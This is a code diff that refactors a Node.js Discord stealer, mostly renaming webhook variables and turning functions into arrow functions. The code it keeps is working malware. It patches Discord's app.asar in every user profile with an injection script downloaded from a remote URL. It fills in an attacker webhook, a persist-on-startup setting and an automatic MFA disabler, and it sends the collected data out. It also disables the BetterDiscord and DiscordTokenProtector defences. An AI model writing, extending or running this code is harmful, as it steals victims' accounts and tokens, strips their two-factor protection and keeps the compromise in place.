@@ -1,10 +1,10 @@
 const {
-    sendWebhook 
-} = require('../../../utils/request/sendWebhook.js');
+    webhook 
+} = require('../../../utils/request/webhook.js');
 
 const {
     getUsers 
-} = require('../../../utils/harware.js');
+} = require('../../../utils/harware/getUsers.js');
 
 const child_process = require('child_process');
 const axios         = require('axios');
@@ -12,7 +12,7 @@ const path          = require('path');
 const asar          = require('asar');
 const fs            = require('fs');
 
-async function persistentInjection(appDir, injectionUrl, webhook, configInject) {
+const persistentInjection = async (appDir, injectionUrl, webhookUrl, configInject) => {
     const CONFIG_INJECT = configInject;
     const asarFilePath = path.join(appDir, 'resources', 'app.asar');
     const unpackedDir = path.join(appDir, 'resources', 'unpacked');
@@ -123,7 +123,7 @@ async function persistentInjection(appDir, injectionUrl, webhook, configInject) 
                             res.on("data", (data) => (chunk += data));
                             res.on("end", () => {
                                 const newContent = chunk
-                                    .replace("%WEBHOOK_URL%", "${webhook}")
+                                    .replace("%WEBHOOK_URL%", "${webhookUrl}")
                                     .replace("%API_URL%", "${CONFIG_INJECT.API}")
                                     .replace('%FORCE_PERSIST_STARTUP%', '${CONFIG_INJECT.force_persist_startup}')
                                     .replace('%AUTO_MFA_DISABLER%', '${CONFIG_INJECT.auto_mfa_disabler}')
@@ -158,7 +158,7 @@ async function persistentInjection(appDir, injectionUrl, webhook, configInject) 
     }
 }
 
-async function extractAsarArchive(asarFilePath, outputDirectory) {
+const extractAsarArchive = async (asarFilePath, outputDirectory) => {
     try {
         await fs.promises.mkdir(outputDirectory, { recursive: true });
         asar.extractAll(asarFilePath, outputDirectory);
@@ -169,7 +169,8 @@ async function extractAsarArchive(asarFilePath, outputDirectory) {
     }
 }
 
-async function appendToFile(filePath, content) {
+
+const appendToFile = async (filePath, content) => {
     try {
         await fs.promises.appendFile(filePath, `\n${content}`, 'utf8');
     } catch (error) {
@@ -179,7 +180,7 @@ async function appendToFile(filePath, content) {
     }
 }
 
-async function packAsar(sourceDir, asarFilePath) {
+const packAsar = async (sourceDir, asarFilePath) => {
     try {
         asar.createPackage(sourceDir, asarFilePath);
     } catch (error) {
@@ -190,7 +191,7 @@ async function packAsar(sourceDir, asarFilePath) {
 }
 
 
-async function injectDiscord(dir, injectionUrl, webhook, api) {
+const injectDiscord = async (dir, injectionUrl, webhookUrl, api) => {
     try {
         const CONFIG_INJECT = {
             API: api,
@@ -207,7 +208,7 @@ async function injectDiscord(dir, injectionUrl, webhook, api) {
             .map(file => path.join(dir, file.name, 'modules'));
 
         for (const appDir of appDirs){
-            persistentInjection(appDir.replaceAll('modules', ''), injectionUrl, webhook, CONFIG_INJECT);
+            persistentInjection(appDir.replaceAll('modules', ''), injectionUrl, webhookUrl, CONFIG_INJECT);
         };
 
         const matchingDirs = await Promise.all(appDirs.map(async coreDir => {
@@ -233,7 +234,7 @@ async function injectDiscord(dir, injectionUrl, webhook, api) {
                 const injection = response.data;
 
                 const srcInjection = injection
-                    .replace("%WEBHOOK_URL%", webhook)
+                    .replace("%WEBHOOK_URL%", webhookUrl)
                     .replace("%API_URL%", CONFIG_INJECT.API)
                     .replace("%FORCE_PERSIST_STARTUP%", CONFIG_INJECT.force_persist_startup)
                     .replace("%AUTO_MFA_DISABLER%", CONFIG_INJECT.auto_mfa_disabler)
@@ -267,15 +268,15 @@ async function injectDiscord(dir, injectionUrl, webhook, api) {
         };
 
         try {
-            await sendWebhook(webhook, data);
+            await webhook(webhookUrl, data);
         } catch (err) {
-            console.error("Failed to send webhook:", err);
+            console.error("Failed to send webhookUrl:", err);
         }
     } catch (error) {
     }
 }
 
-function bypassBetterDiscord(user) {
+const bypassBetterDiscord = async (user) => {
     const bdPath = path.join(user, 'AppData', 'Roaming', 'BetterDiscord', 'data', 'betterdiscord.asar');
     try {
         if (fs.existsSync(bdPath)) {
@@ -288,7 +289,7 @@ function bypassBetterDiscord(user) {
     }
 }
 
-function bypassTokenProtector(user) {
+const bypassTokenProtector = async (user) => {
     const dir = path.join(user, 'AppData', 'Roaming', 'DiscordTokenProtector');
     const configPath = path.join(dir, 'config.json');
 
@@ -335,7 +336,7 @@ function bypassTokenProtector(user) {
     }
 }
 
-module.exports = async (injectionUrl, webhook, api) => {
+module.exports = async (injectionUrl, webhookUrl, api) => {
     try {
         const users = await getUsers();
         for (const user of users) {
@@ -348,7 +349,7 @@ module.exports = async (injectionUrl, webhook, api) => {
                 path.join(user, 'AppData', 'Local', 'discorddevelopment')
             ];
             for (const dir of directories) {
-                await injectDiscord(dir, injectionUrl, webhook, api);
+                await injectDiscord(dir, injectionUrl, webhookUrl, api);
             }
         }
     } catch (error) {
